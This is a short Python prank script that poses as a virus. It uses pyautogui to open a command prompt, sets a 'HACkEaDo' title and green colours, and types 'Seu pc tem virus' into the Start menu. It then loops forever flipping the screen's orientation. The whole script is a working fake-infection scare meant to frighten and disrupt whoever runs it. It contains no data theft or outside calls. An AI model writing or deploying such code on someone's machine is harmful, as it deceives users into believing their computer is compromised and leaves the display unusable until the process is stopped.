import rotatescreen
from time import *
from tkinter import *
import pyautogui as gui

gui.PAUSE = 0.5

gui.hotkey("win", "r")
gui.write("cmd")
gui.press("enter")
gui.write("cd ..")
gui.press("enter")
gui.write("cd ..")
gui.press("enter")
gui.write("cd ..")
gui.press("enter")
gui.write("color a0")
gui.press("enter")
gui.write("title HACkEaDo")
gui.press("enter")
gui.write("cls")
gui.press("enter")
gui.write("tree")
gui.press("enter")

gui.press("win")
gui.write("Seu pc tem virus")

def windNew():
  jan = Tk()
  jan.geometry("400x400")
  jan.title("Hackeado")
  jan.configure(bg='green')

  return jan


while True:
  screen = rotatescreen.get_primary_display()
  screen.set_portrait_flipped()
  screen.set_portrait()
  screen.set_portrait_flipped()

